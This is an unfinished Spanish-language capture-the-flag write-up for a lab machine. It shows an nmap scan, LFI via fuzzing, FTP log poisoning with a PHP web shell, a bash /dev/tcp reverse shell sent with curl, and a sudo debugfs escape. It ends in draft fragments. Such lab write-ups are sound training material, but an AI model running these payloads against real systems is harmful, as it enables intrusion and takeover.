# hannah_coffee - Writeup

## Resumen
Lorem Ipsum

## Paso N1: Escaneo de puertos TCP
empezamos escaneando la maquina para detectar los puertos tcp y sus desterminados servicios y versiones.
```
nmap 172.17.0.2 -sS -sVC -n -Pn -p- --open --min-rate 5000
```
![scan](img)
Podemos ver que estan abiertos los puertos TCP 80 y 21, por lo que procederemos a investigar la web.

## Paso N2: Busqueda de parametros vulnerables
Al investigar la pagina, podemos llegar a entrar a una direccion con el parametro ```page```
```
http://172.17.0.2/index.php?page=menu
```
Buscaremos algun parametro vulnerable para poder ejecutar comandos y realizar un Local FIle Inclusion.

Para ello utilizaremos ```wfuzz``` para buscar diferentes parametros vulnerables con el siguiente comando.
```
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hl 29 -u http://172.17.0.2/index.php?FUZZ=test
```
![fuzz](img)
Encontramos el parametro vulnerable *studio*, por lo que podemos movernos libremente por los recursos internos de la web.

## Paso N3: Entrar a logs del servicio ftp
Debemos entrar a los logs del servicio ftp, los cuales generalmente estan ubicados en ```/var/log/vsftpd.log```.
```
http://172.17.0.2/index.php?studio=/var/log/vsftpd.log
```
![logs](img)
Tenemos acceso a los logs del servicio ftp, por lo que intentaremos inyectar codigo php para movernos en el sistema y lograr ejecutar comando en el.

## Paso N4: FTP LogPoisoning + LFI
entraremos al servicio ftp con el comando ```ftp 172.17.0.2``` y pondremos de nombre el siguiente codigo php.
```
<?php system($_GET['cmd']); ?>
```
una vez ejecutado, podremos ejecutar comando dentro de la pagina.¡ y se veran ejecutador en el log.
![log](img)

ahora, podremos ejecutar comando usando:
```
http://172.17.0.2/index.php?studio=/var/log/vsftpd.log&cmd=command
```

## Paso N5: Ejecutando reverse shell
Ahora que podemos ejecutar comandos en la pagina, usaremos una terminal para escuchar en el puerto 4040 de esta manera 
```
nc -lvnp 4040
```
En otra terminal ejecutaremos el comando que nos dara acceso.
```
curl -G "http://172.17.0.2/index.php" --data-urlencode "studio=/var/log/vsftpd.log" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/172.17.0.1/4040 0>&1'"
```
Usamos ```curl``` ya que si copiamos directamente el comando en la barra de busqueda no se ejecutara ya que google no codifica automaticamente los caracteres iniciales, por lo que lo ejecutaremos con ```curl``` y en la terminal en la que estabamos escuchando ganaremos acceso a la maquina.

## Paso N6: Accediendo a usuarios del sistema
ejecutamos el comando sudo -l y nos devuelve lo siguiente:
```
(hannah) NOPASSWD: /sbin/debugfs -w /opt/hannah_disk.img
```
Para ganar acceso al usuario hannah ejecutaremos el siguiente comando:
```
sudo -u hannah /sbin/debugfs -w /opt/hannah_disk.img

!/bin/sh
```
Una vez ejecutado, accederemos al usuario hannah.

## Paso N7: Escalando privilegios
Una vez estando en el usuario hannah, investigando los directorios principarles nos daremos cuenta que en la carpeta /opt hay un archivo llamado priv-python el cual el dueño es root, con grupo hannah y tenemos permiso de lectura y ejecucion.

Verificamos si el archivo tiene capabilities con el siguiente comando 
```
getcap /opt/priv-python
```




Raw Text 
escaneamos
fuzzeamos parametro vulnerable

http://172.17.0.2/index.php?studio=/var/log/vsftpd.log

usamos comandos 

Raw Command





```
find / -perm -4000 2>/dev/null
```
